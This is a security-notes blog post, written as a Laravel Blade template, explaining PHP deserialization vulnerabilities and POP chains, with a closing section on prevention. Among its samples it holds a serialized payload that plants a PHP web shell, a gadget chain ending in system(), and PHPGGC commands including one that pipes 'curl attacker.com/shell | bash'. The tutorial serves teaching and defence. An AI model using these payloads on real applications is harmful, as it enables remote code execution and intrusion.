@extends('layouts.app')
@section('title', 'PHP Object Deserialization & POP Chains - Notes')
@section('content')
<style>
    @import url('https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=IBM+Plex+Mono:wght@400;500&display=swap');
    :root{--bg:#0a0e17;--surface:#0f1522;--border:#1e2d45;--accent:#00c2ff;--accent2:#7b61ff;--text:#c9d8ef;--muted:#566a85;--green:#00e5a0;--red:#ff4d6d;--yellow:#f0b429;--orange:#ff9f43;}
    .post-root{background:var(--bg);font-family:'Syne',sans-serif;min-height:100vh;color:var(--text);}
    .post-topbar{border-bottom:1px solid var(--border);background:var(--surface);padding:12px 0;position:sticky;top:0;z-index:50;backdrop-filter:blur(8px);}
    .post-topbar-inner{max-width:960px;margin:0 auto;padding:0 32px;}
    .breadcrumb{display:flex;align-items:center;gap:8px;font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--muted);flex-wrap:wrap;}
    .breadcrumb a{color:var(--muted);text-decoration:none;} .breadcrumb a:hover{color:var(--accent);} .breadcrumb-sep{opacity:.35;font-size:10px;} .breadcrumb-current{color:var(--text);}
    .post-body{max-width:960px;margin:0 auto;padding:48px 32px 100px;}
    .article-card{background:var(--surface);border:1px solid var(--border);border-radius:12px;overflow:hidden;}
    .article-card-inner{padding:48px;}
    .cat-badge{display:inline-flex;align-items:center;gap:7px;font-family:'IBM Plex Mono',monospace;font-size:10px;padding:4px 12px;border-radius:3px;text-transform:uppercase;letter-spacing:.08em;margin-bottom:24px;background:rgba(255,159,67,0.1);color:var(--orange);border:1px solid rgba(255,159,67,0.25);}
    .article-title{font-size:clamp(26px,4vw,38px);font-weight:800;color:#fff;line-height:1.15;letter-spacing:-.02em;margin-bottom:20px;}
    .meta-row{display:flex;flex-wrap:wrap;gap:20px;margin-bottom:28px;padding-bottom:28px;border-bottom:1px solid var(--border);}
    .meta-item{display:flex;align-items:center;gap:7px;font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--muted);} .meta-item svg{width:13px;height:13px;}
    .read-btn{display:inline-flex;align-items:center;gap:8px;background:transparent;border:1px solid var(--border);border-radius:6px;padding:9px 18px;font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--text);cursor:pointer;transition:all .2s;margin-bottom:40px;} .read-btn:hover{border-color:var(--orange);color:var(--orange);}
    .article-prose{line-height:1.8;font-size:15px;color:var(--text);}
    .article-prose h2{font-size:24px;font-weight:800;color:#fff;margin:48px 0 20px;}
    .article-prose h3{font-size:18px;font-weight:700;color:var(--orange);margin:40px 0 16px;font-family:'IBM Plex Mono',monospace;display:flex;align-items:center;gap:10px;} .article-prose h3::before{content:'//';color:var(--accent2);font-size:14px;opacity:.7;}
    .article-prose p{margin-bottom:16px;} .article-prose strong{color:#fff;} .article-prose a{color:var(--accent);text-decoration:underline;}
    .article-prose ul{list-style:none;padding:0;margin-bottom:20px;display:flex;flex-direction:column;gap:10px;} .article-prose ul li{padding-left:20px;position:relative;} .article-prose ul li::before{content:'›';position:absolute;left:0;color:var(--orange);font-size:16px;line-height:1.6;}
    .article-prose pre{background:#060a12;border:1px solid var(--border);border-radius:8px;padding:20px 24px;overflow-x:auto;margin:24px 0;position:relative;} .article-prose pre code{font-family:'IBM Plex Mono',monospace;font-size:13px;color:#00e5a0;background:none;padding:0;}
    .article-prose code{font-family:'IBM Plex Mono',monospace;font-size:13px;background:rgba(255,159,67,0.08);color:var(--orange);padding:2px 7px;border-radius:3px;border:1px solid rgba(255,159,67,0.2);}
    .copy-code{position:absolute!important;top:10px;right:10px;background:var(--surface);border:1px solid var(--border);border-radius:4px;color:var(--muted);padding:4px 10px;font-family:'IBM Plex Mono',monospace;font-size:10px;cursor:pointer;} .copy-code:hover{border-color:var(--orange);color:var(--orange);} .copy-code.copied{border-color:var(--green);color:var(--green);}
    .callout{border-radius:8px;padding:18px 22px;margin:24px 0;display:flex;gap:14px;align-items:flex-start;} .callout-icon{font-size:18px;flex-shrink:0;margin-top:2px;} .callout p{margin:0;font-size:14px;line-height:1.7;} .callout strong{font-weight:700;}
    .callout-warning{background:rgba(240,180,41,0.06);border:1px solid rgba(240,180,41,0.25);} .callout-warning p{color:#f5d67a;} .callout-warning strong{color:var(--yellow);}
    .callout-info{background:rgba(255,159,67,0.05);border:1px solid rgba(255,159,67,0.2);} .callout-info p{color:var(--text);} .callout-info strong{color:var(--orange);}
    .callout-success{background:rgba(0,229,160,0.05);border:1px solid rgba(0,229,160,0.25);} .callout-success p{color:#7ff3cd;} .callout-success strong{color:var(--green);}
    .callout-danger{background:rgba(255,77,109,0.05);border:1px solid rgba(255,77,109,0.25);} .callout-danger p{color:#ffb3c0;} .callout-danger strong{color:var(--red);}
    @media(max-width:768px){.post-body{padding:24px 16px 60px;}.article-card-inner{padding:24px;}.post-topbar-inner{padding:0 16px;}}
</style>

<div class="post-root">
    <div class="post-topbar"><div class="post-topbar-inner">
        <nav class="breadcrumb">
            <a href="{{ route('home') }}">Home</a><span class="breadcrumb-sep">›</span>
            <a href="{{ route('posts.index') }}">Notes</a><span class="breadcrumb-sep">›</span>
            <a href="{{ route('posts.index') }}?category=php">PHP Security</a><span class="breadcrumb-sep">›</span>
            <span class="breadcrumb-current">PHP Object Deserialization</span>
        </nav>
    </div></div>

    <div class="post-body"><div class="article-card"><div class="article-card-inner">
        <div><span class="cat-badge">PHP Security</span></div>
        <h1 class="article-title">PHP Object Deserialization & POP Chains</h1>
        <div class="meta-row">
            <div class="meta-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>Youssef</div>
            <div class="meta-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="4" width="18" height="18" rx="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>{{ now()->format('d M Y') }}</div>
            <div class="meta-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>0 views</div>
        </div>
        <button id="read-btn" class="read-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/><path d="M15.54 8.46a5 5 0 0 1 0 7.07"/></svg>Read Aloud</button>

        <div class="article-prose" id="article-content">

            <h2>PHP Object Deserialization & POP Chains</h2>

            <h3>How PHP Serialization Works</h3>
            <p>PHP's <code>serialize()</code> converts objects/arrays into a string representation. <code>unserialize()</code> reconstructs them. The format encodes class name, properties, and values.</p>
            <pre><code>// Object structure
class User {
    public $name = "alice";
    public $isAdmin = false;
}

// Serialized output of new User():
// O:4:"User":2:{s:4:"name";s:5:"alice";s:7:"isAdmin";b:0;}
//
// Format: O:[classname_length]:"[classname]":[prop_count]:{properties...}
// s = string, i = integer, b = boolean, N = null, a = array, O = object</code></pre>

            <h3>The Vulnerability</h3>
            <p>When user-controlled data is passed to <code>unserialize()</code>, the attacker can craft a serialized string representing any class available in the application's codebase. During deserialization, PHP automatically calls <strong>magic methods</strong>.</p>
            <pre><code>// VULNERABLE — common locations
$obj = unserialize($_COOKIE['data']);
$obj = unserialize(base64_decode($_GET['token']));
$obj = unserialize(file_get_contents('php://input'));</code></pre>

            <h3>Magic Methods — the Exploitation Surface</h3>
            <ul>
                <li><code>__wakeup()</code> — called immediately when <code>unserialize()</code> is invoked</li>
                <li><code>__destruct()</code> — called when the object is garbage collected (end of script)</li>
                <li><code>__toString()</code> — called when the object is used as a string</li>
                <li><code>__get($name)</code> — called on inaccessible property read</li>
                <li><code>__set($name, $value)</code> — called on inaccessible property write</li>
                <li><code>__call($name, $args)</code> — called on inaccessible method call</li>
                <li><code>__invoke()</code> — called when object is used as function</li>
            </ul>

            <h3>Simple Deserialization Attack</h3>
            <pre><code>// Vulnerable class in application:
class Logger {
    public $logfile = '/tmp/app.log';
    public $data = '';

    public function __destruct() {
        file_put_contents($this->logfile, $this->data);
    }
}

// Attacker crafts payload:
$evil = new Logger();
$evil->logfile = '/var/www/html/shell.php';
$evil->data = '<?php system($_GET["cmd"]); ?>';

echo serialize($evil);
// O:6:"Logger":2:{s:7:"logfile";s:25:"/var/www/html/shell.php";s:4:"data";s:30:"<?php system($_GET["cmd"]); ?>";}

// Send as cookie: ?data=[base64 of payload]
// On script end → __destruct() writes PHP shell → RCE</code></pre>

            <h3>Property-Oriented Programming (POP Chains)</h3>
            <p>Real applications rarely have a single class that trivially leads to RCE. Instead, attackers chain multiple classes together — each magic method calls a method on another object, until execution reaches a dangerous sink. This is called a POP chain.</p>
            <pre><code>// Chain example: A.__destruct() → B.__toString() → C.__call() → system()

class A {
    public $obj;
    public function __destruct() {
        echo $this->obj;          // triggers B::__toString()
    }
}

class B {
    public $obj;
    public function __toString() {
        return $this->obj->run(); // triggers C::__call()
    }
}

class C {
    public $cmd;
    public function __call($name, $args) {
        system($this->cmd);       // SINK — RCE
    }
}

// Build the chain:
$c = new C(); $c->cmd = 'id';
$b = new B(); $b->obj = $c;
$a = new A(); $a->obj = $b;

echo base64_encode(serialize($a));</code></pre>

            <h3>Tools — PHPGGC (PHP Generic Gadget Chains)</h3>
            <p>PHPGGC is the PHP equivalent of ysoserial for Java. It contains ready-made POP chains for popular PHP frameworks and libraries (Laravel, Symfony, Yii, Magento, Guzzle, etc.).</p>
            <pre><code># List available gadget chains
phpggc -l

# Generate payload for Laravel RCE
phpggc Laravel/RCE1 system id | base64

# Generate for Symfony
phpggc Symfony/RCE4 exec 'curl attacker.com/shell | bash' | base64

# With URL encoding
phpggc -u Laravel/RCE1 system 'id'</code></pre>

            <h3>Finding Deserialization Sinks</h3>
            <pre><code># Grep for unserialize in PHP source
grep -r "unserialize" --include="*.php" .

# Also check:
grep -r "fromJson\|fromString\|deserialize" --include="*.php" .</code></pre>

            <div class="callout callout-warning">
                <div class="callout-icon">⚠️</div>
                <p><strong>Note:</strong> The dangerous classes (gadgets) must be available in the application's autoloader. Gadget chains only work if the application uses the vulnerable library version. Always verify what's in <code>composer.json</code> / <code>vendor/</code>.</p>
            </div>

            <h3>Prevention</h3>
            <ul>
                <li>Never pass user-controlled data to <code>unserialize()</code></li>
                <li>Use JSON (<code>json_decode()</code>) instead of PHP serialization for user data</li>
                <li>Implement <code>__wakeup()</code> with strict validation to reject unexpected states</li>
                <li>Use PHP 7+'s <code>unserialize($data, ['allowed_classes' => false])</code> or whitelist specific classes</li>
            </ul>

            <pre><code>// PHP 7+ — restrict allowed classes during unserialize
$obj = unserialize($data, ['allowed_classes' => ['SafeClass']]);

// Better — use JSON instead
$data = json_decode($_COOKIE['data'], true); // no object instantiation</code></pre>

            <div class="callout callout-success">
                <div class="callout-icon">✅</div>
                <p><strong>Key Insight:</strong> The attack surface of deserialization is the entire application's class hierarchy. The more third-party libraries an application uses, the more gadget chain candidates are available. Always check PHPGGC against the application's dependency stack.</p>
            </div>

        </div>
    </div></div></div>
</div>
@endsection
@section('scripts')
<script>
document.addEventListener('DOMContentLoaded',function(){document.querySelectorAll('pre').forEach(pre=>{pre.style.position='relative';const btn=document.createElement('button');btn.className='copy-code';btn.textContent='copy';pre.appendChild(btn);btn.addEventListener('click',()=>{const code=pre.querySelector('code')?.textContent??pre.textContent;navigator.clipboard.writeText(code).then(()=>{btn.textContent='copied!';btn.classList.add('copied');setTimeout(()=>{btn.textContent='copy';btn.classList.remove('copied');},2000);});});});const r=document.getElementById('read-btn');const c=document.getElementById('article-content');if(r&&c){let reading=false;r.addEventListener('click',()=>{if(!reading){const u=new SpeechSynthesisUtterance(c.innerText);u.lang='en-US';speechSynthesis.speak(u);reading=true;r.textContent='Stop';u.onend=()=>{reading=false;r.textContent='Read Aloud'};}else{speechSynthesis.cancel();reading=false;r.textContent='Read Aloud';}});}});
</script>
@endsection
